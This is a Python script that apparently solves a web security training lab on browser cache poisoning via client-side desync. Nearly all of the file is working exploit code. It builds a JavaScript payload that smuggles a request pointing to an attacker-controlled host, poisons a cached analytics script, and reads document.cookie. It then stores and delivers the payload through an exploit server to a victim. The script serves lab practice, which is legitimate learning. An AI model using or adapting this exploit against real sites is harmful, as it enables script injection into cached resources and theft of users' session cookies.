# Browser cache poisoning via client-side desync

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings

TIMEOUT = 5

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def store_payload(url, payload, attacker):
	store_exploit_path = attacker
	store_exploit_data = {
			"formAction": "STORE",
			"urlIsHttps": "on",
			"responseFile": "/exploit",
			"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
			"responseBody": payload
	}
	r = requests.post(store_exploit_path, data=store_exploit_data, verify=False, proxies=proxies)
	time.sleep(1)
	deliver_exploit_data = {
			"formAction": "DELIVER_TO_VICTIM",
			"urlIsHttps": "on",
			"responseFile": "/exploit",
			"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
			"responseBody": payload
	}
	r = requests.post(store_exploit_path, data=deliver_exploit_data, verify=False, proxies=proxies)
	time.sleep(1)
	print('\n[+] Targeted endpoint or query parameter:\n\t%s' % url)
	print('\n[+] Using payload:\n%s' % payload)
	print('\n[+] Delivered to the victim via:\t%s' % store_exploit_path + store_exploit_data["responseFile"])
	return r

def build_payload(url, attacker):
	payload_to_send = f"""alert(document.cookie);
/*
<script>
    const labURL = "https://{url}";
    const exploitHost = "{attacker}";

    if(window.name != 'skip'){{
        window.name = 'skip';
        fetch(`${{labURL}}/..%2f`, {{ method: 'POST', body: `GET //${{exploitHost}}/eXpLoIt HTTP/1.1\\r\\nFoo: x`, credentials: 'include', mode: 'no-cors' }}).then(() => {{location=`${{labURL}}/resources/js/analytics.js`}} );
    }} else {{
        window.name = '';
        location = `${{labURL}}/login`;
    }}
</script>
*/"""
	return payload_to_send

def main():
	print('[+] Lab: Browser cache poisoning via client-side desync')
	try:
		url = sys.argv[1].strip()
		attacker = sys.argv[2].strip()
	except IndexError:
		print('[+] Usage: %s <URL> <ATTACKER>' % sys.argv[0])
		sys.exit(-1)
	s = requests.Session()
	s.proxies = proxies
	s.verify = False
	r = s.get(url, allow_redirects=False, proxies=proxies, verify=False)
	if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
		print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
		sys.exit(-1)
	else:
		time.sleep(1)
		parsed_url = urllib.parse.urlparse(url)
		print(parsed_url)
		subdomain = parsed_url.netloc
		if parsed_url.port:
			port = parsed_url.port
		elif parsed_url.scheme == "https":
			port = 443
		elif parsed_url.scheme == "http":
			port = 80
		atk_url = urllib.parse.urlparse(attacker)
		print(atk_url)
		atk_domain = atk_url.netloc
		if atk_url.port:
			atk_port = atk_url.port
		elif atk_url.scheme == "https":
			atk_port = 443
		elif atk_url.scheme == "http":
			atk_port = 80
		r = s.get(url, allow_redirects=False, proxies=proxies, verify=False)
		time.sleep(1)
		print("------------------------------------------------------")
		payload = build_payload(subdomain, atk_domain)
		r = store_payload(subdomain, payload, atk_url.scheme + '://' + atk_domain)
		time.sleep(TIMEOUT)
		r = requests.get(url, verify=False, proxies=proxies)
		print(r)
		if 'Congratulations, you solved the lab!' in r.text:
			print('[+] The lab is solved !')
			solved = True

if __name__ == "__main__":
	main()
